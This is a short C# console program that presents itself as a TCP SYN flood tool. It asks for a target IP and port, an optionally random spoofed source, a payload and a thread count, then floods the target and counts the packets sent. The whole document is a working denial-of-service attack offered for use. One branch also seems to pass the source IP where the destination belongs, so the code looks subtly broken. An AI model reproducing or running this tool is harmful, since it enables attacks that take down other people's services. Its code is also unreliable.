using WebStreetTest;

TcpPacketSender sender = new TcpPacketSender();

Console.WriteLine("Thank you for using my TCP SYN flood program!\n\n\n");
Console.WriteLine("Enter the source IP address(Enter random for random source IP and don't enter 127.X.X.X it won't works):");
string SrcIP= Console.ReadLine();

Console.WriteLine("Enter the dest IP number:");
string DestIP = Console.ReadLine();

Console.WriteLine("Enter the dest port number:");
ushort DestPort = ushort.Parse(Console.ReadLine());

Console.WriteLine("Enter the message to send(Enter random for random message):");
string message = Console.ReadLine();

Console.WriteLine("Enter the number of thread:");
uint ThreadNum = uint.Parse(Console.ReadLine());

if (SrcIP.Equals("random"))
{
    sender.Build(DestIP, DestPort, message, 0, ThreadNum, TcpFlags.SYN, message == "random" ? DataType.Random : DataType.Fixed);
}
else
{
    sender.Build(SrcIP, DestPort, message, 0, ThreadNum, TcpFlags.SYN, message == "random" ? DataType.Random : DataType.Fixed);
}

Console.WriteLine("Starting attack!");
sender.Run();
while(true)
{
    Thread.Sleep(1000);
    Console.WriteLine("Send:"+sender.syncUlong);
}
